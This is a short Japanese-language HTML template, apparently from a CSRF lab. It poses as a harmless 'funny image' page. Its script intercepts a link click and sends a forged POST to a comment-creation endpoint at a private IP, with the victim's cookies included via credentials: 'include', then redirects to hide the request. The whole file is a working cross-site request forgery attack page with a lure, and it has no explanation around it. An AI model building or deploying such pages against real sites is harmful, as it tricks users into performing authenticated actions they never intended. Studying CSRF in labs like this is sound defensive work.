<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <title>Document</title>
  <link rel="stylesheet" href="{{ asset('css/csrf.css') }}">
</head>
<body>
  <h1>😈怪しくないサイト😈</h1>
  <a href="#" id="link">超面白い画像はこちら！→</a>

  <script>
    const targetURL = 'http://192.168.56.10:8000/comments/create';
    const link = document.getElementById('link');
    link.addEventListener('click', function(e) {
      e.preventDefault();

      const formData = new FormData();
      formData.append('body', '罠サイトからこんにちは');

      const fetchOption = {
        method: 'POST',
        mode: 'no-cors',
        credentials: 'include',
        body: formData
      };

      fetch(targetURL, fetchOption).then(() => {
        location.href = '/photo';
      });
    });
  </script>
</body>
</html>